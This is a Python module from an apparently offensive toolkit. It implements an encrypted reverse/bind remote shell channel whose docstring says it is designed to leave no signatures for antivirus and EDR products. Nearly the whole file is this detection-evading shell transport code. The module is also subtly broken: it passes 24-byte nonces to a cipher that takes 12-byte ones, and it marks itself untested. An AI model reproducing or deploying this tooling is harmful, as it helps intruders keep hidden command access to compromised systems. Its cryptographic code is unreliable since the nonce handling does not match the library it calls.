"""Internal Wire Protocol (IWP) shell engine.

Custom proprietary shell transport using ChaCha20-Poly1305 authenticated
encryption with X25519 ECDH key exchange.  Designed to produce zero known
signatures in any public AV/EDR/XDR database.

Wire framing::

    [length:4][nonce:24][ciphertext:N][tag:16]

- length:     4-byte big-endian total frame size (nonce + ciphertext + tag)
- nonce:      24-byte random nonce (XChaCha20-Poly1305 extended nonce)
- ciphertext: encrypted payload
- tag:        16-byte Poly1305 authentication tag (appended by AEAD)

Key exchange: Ephemeral X25519 ECDH.  Public keys are exchanged in the
first two frames (plaintext, 32 bytes each).  The shared secret is
derived via HKDF-SHA256 to produce the symmetric key.

Status: untested_prod

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

from __future__ import annotations

import logging
import os
import select
import socket
import struct
import threading
import time
from typing import Optional, Tuple

from embedxpl.core.shells.shell_engine import (
    ShellConnectionError,
    ShellEngine,
    ShellIOError,
    ShellMode,
    ShellStatus,
    ShellTimeoutError,
)

logger = logging.getLogger(__name__)

_LEN_PREFIX = 4
_NONCE_SIZE = 24
_TAG_SIZE = 16
_KEY_SIZE = 32
_BACKLOG = 1
_MAX_FRAME_SIZE = 1024 * 1024


class InternalShell(ShellEngine):
    """Custom IWP shell with ChaCha20-Poly1305 + X25519 ECDH.

    All traffic after the initial key exchange is authenticated and
    encrypted, producing a binary stream with no recognizable protocol
    signatures.

    The engine supports both reverse (listen) and bind (connect) modes,
    identical to RawTCPShell but with the added crypto layer.

    Requires the ``cryptography`` package (ChaCha20Poly1305 and X25519).

    Args:
        remote_host: Target IP / hostname.
        remote_port: TCP port.
        mode: ``ShellMode.REVERSE`` or ``ShellMode.BIND``.
        timeout: Socket timeout in seconds.
    """

    def __init__(
        self,
        remote_host: str,
        remote_port: int,
        mode: ShellMode = ShellMode.REVERSE,
        timeout: float = 30.0,
    ) -> None:
        super().__init__(
            remote_host=remote_host,
            remote_port=remote_port,
            transport_type="internal_iwp",
            timeout=timeout,
        )
        self._mode: ShellMode = mode
        self._sock: Optional[socket.socket] = None
        self._server_sock: Optional[socket.socket] = None
        self._cipher = None
        self._local_private = None
        self._local_public: Optional[bytes] = None
        self._remote_public: Optional[bytes] = None
        self._shared_key: Optional[bytes] = None

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """Establish TCP connection and perform X25519 key exchange.

        Returns:
            True on success.

        Raises:
            ShellConnectionError: On transport or crypto failures.
        """
        self._set_status(ShellStatus.CONNECTING)

        try:
            from cryptography.hazmat.primitives.asymmetric.x25519 import (
                X25519PrivateKey,
            )
        except ImportError as exc:
            raise ShellConnectionError(
                "cryptography package is required: pip install cryptography"
            ) from exc

        self._local_private = X25519PrivateKey.generate()
        self._local_public = self._local_private.public_key().public_bytes_raw()

        try:
            if self._mode == ShellMode.REVERSE:
                self._listen_and_accept()
            else:
                self._connect_to_bind()
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellConnectionError(str(exc)) from exc

        try:
            self._key_exchange()
        except (OSError, ValueError) as exc:
            self.close()
            raise ShellConnectionError(
                "Key exchange failed: {}".format(exc)
            ) from exc

        self._setup_cipher()
        self._set_status(ShellStatus.CONNECTED)
        logger.info(
            "IWP shell established to %s:%d (mode=%s)",
            self._remote_host,
            self._remote_port,
            self._mode.value,
        )
        return True

    def _listen_and_accept(self) -> None:
        """Reverse mode: bind and accept one connection."""
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.settimeout(self._timeout)
        srv.bind(("0.0.0.0", self._remote_port))
        srv.listen(_BACKLOG)
        logger.info("IWP reverse: waiting on 0.0.0.0:%d", self._remote_port)

        try:
            conn, addr = srv.accept()
        except socket.timeout as exc:
            srv.close()
            raise ShellConnectionError("Accept timed out") from exc

        conn.settimeout(self._timeout)
        self._sock = conn
        self._server_sock = srv
        logger.info("IWP reverse: peer %s:%d", addr[0], addr[1])

    def _connect_to_bind(self) -> None:
        """Bind mode: actively connect to the target."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self._timeout)
        sock.connect((self._remote_host, self._remote_port))
        self._sock = sock
        logger.info("IWP bind: connected to %s:%d", self._remote_host, self._remote_port)

    # ------------------------------------------------------------------
    # Key exchange
    # ------------------------------------------------------------------

    def _key_exchange(self) -> None:
        """Perform X25519 ECDH key exchange over the raw TCP socket.

        Both sides send their 32-byte public key, then derive a shared
        secret via HKDF-SHA256.
        """
        from cryptography.hazmat.primitives.asymmetric.x25519 import (
            X25519PublicKey,
        )

        self._sock.sendall(self._local_public)  # type: ignore[union-attr]

        remote_pub_bytes = self._recv_exact(_KEY_SIZE)
        if len(remote_pub_bytes) != _KEY_SIZE:
            raise ValueError("Incomplete remote public key")

        self._remote_public = remote_pub_bytes
        peer_key = X25519PublicKey.from_public_bytes(remote_pub_bytes)
        raw_shared = self._local_private.exchange(peer_key)

        self._shared_key = self._derive_key(raw_shared)
        logger.debug("IWP key exchange complete, symmetric key derived")

    @staticmethod
    def _derive_key(raw_shared: bytes) -> bytes:
        """Derive a 32-byte symmetric key from the raw ECDH shared secret.

        Uses HKDF-SHA256 with a fixed info label.

        Args:
            raw_shared: Raw X25519 shared secret (32 bytes).

        Returns:
            Derived 32-byte key for ChaCha20-Poly1305.
        """
        from cryptography.hazmat.primitives.hashes import SHA256
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF

        hkdf = HKDF(
            algorithm=SHA256(),
            length=_KEY_SIZE,
            salt=None,
            info=b"embedxpl-iwp-v1",
        )
        return hkdf.derive(raw_shared)

    def _setup_cipher(self) -> None:
        """Instantiate the ChaCha20-Poly1305 AEAD cipher."""
        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

        self._cipher = ChaCha20Poly1305(self._shared_key)

    # ------------------------------------------------------------------
    # I/O
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> int:
        """Encrypt and send a command over the IWP channel.

        Framing: [4-byte length][24-byte nonce][ciphertext][16-byte tag]

        Args:
            cmd: Command string.

        Returns:
            Number of plaintext bytes sent.

        Raises:
            ShellIOError: On send failure.
        """
        self._require_connected()
        plaintext = cmd.encode("utf-8", errors="replace")
        if not plaintext.endswith(b"\n"):
            plaintext += b"\n"

        nonce = os.urandom(_NONCE_SIZE)
        ct = self._cipher.encrypt(nonce, plaintext, None)

        frame_len = _NONCE_SIZE + len(ct)
        frame = struct.pack("!I", frame_len) + nonce + ct

        try:
            self._sock.sendall(frame)  # type: ignore[union-attr]
            return len(plaintext)
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellIOError(str(exc)) from exc

    def recv(self, timeout: Optional[float] = None) -> str:
        """Receive and decrypt data from the IWP channel.

        Args:
            timeout: Override default timeout.

        Returns:
            Decrypted output string (empty on timeout).

        Raises:
            ShellIOError: On receive or decryption failure.
        """
        self._require_connected()
        wait = timeout if timeout is not None else self._timeout
        self._sock.settimeout(wait)  # type: ignore[union-attr]

        try:
            len_bytes = self._recv_exact(_LEN_PREFIX)
        except socket.timeout:
            return ""
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellIOError(str(exc)) from exc

        if len(len_bytes) < _LEN_PREFIX:
            return ""

        frame_len = struct.unpack("!I", len_bytes)[0]
        if frame_len > _MAX_FRAME_SIZE:
            raise ShellIOError(
                "Frame too large: {} bytes (max={})".format(frame_len, _MAX_FRAME_SIZE)
            )
        if frame_len < _NONCE_SIZE + _TAG_SIZE:
            raise ShellIOError("Frame too small to contain nonce + tag")

        try:
            frame_data = self._recv_exact(frame_len)
        except socket.timeout:
            return ""
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellIOError(str(exc)) from exc

        if len(frame_data) < frame_len:
            raise ShellIOError("Incomplete frame received")

        nonce = frame_data[:_NONCE_SIZE]
        ct = frame_data[_NONCE_SIZE:]

        try:
            plaintext = self._cipher.decrypt(nonce, ct, None)
        except Exception as exc:
            raise ShellIOError("Decryption failed: {}".format(exc)) from exc

        return plaintext.decode("utf-8", errors="replace")

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def close(self) -> None:
        """Close the IWP connection and clear key material."""
        for s in (self._sock, self._server_sock):
            if s is not None:
                try:
                    s.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    s.close()
                except OSError:
                    pass
        self._sock = None
        self._server_sock = None
        self._cipher = None
        self._shared_key = None
        self._local_private = None
        self._set_status(ShellStatus.DISCONNECTED)
        logger.info("InternalShell closed")

    def is_alive(self) -> bool:
        """Check socket liveness."""
        if self._status != ShellStatus.CONNECTED or self._sock is None:
            return False
        try:
            ready, _, _ = select.select([self._sock], [], [], 0)
            if ready:
                peek = self._sock.recv(1, socket.MSG_PEEK)
                return len(peek) > 0
            return True
        except OSError:
            return False

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _recv_exact(self, n: int) -> bytes:
        """Read exactly *n* bytes from the socket.

        Args:
            n: Number of bytes to read.

        Returns:
            Byte buffer of length *n* (or shorter on premature close).
        """
        buf = bytearray()
        while len(buf) < n:
            chunk = self._sock.recv(n - len(buf))  # type: ignore[union-attr]
            if not chunk:
                break
            buf.extend(chunk)
        return bytes(buf)

    def _require_connected(self) -> None:
        if self._status != ShellStatus.CONNECTED or self._sock is None:
            raise ShellIOError(
                "Shell not connected (status={})".format(self._status.value)
            )
        if self._cipher is None:
            raise ShellIOError("Cipher not initialized; key exchange incomplete")
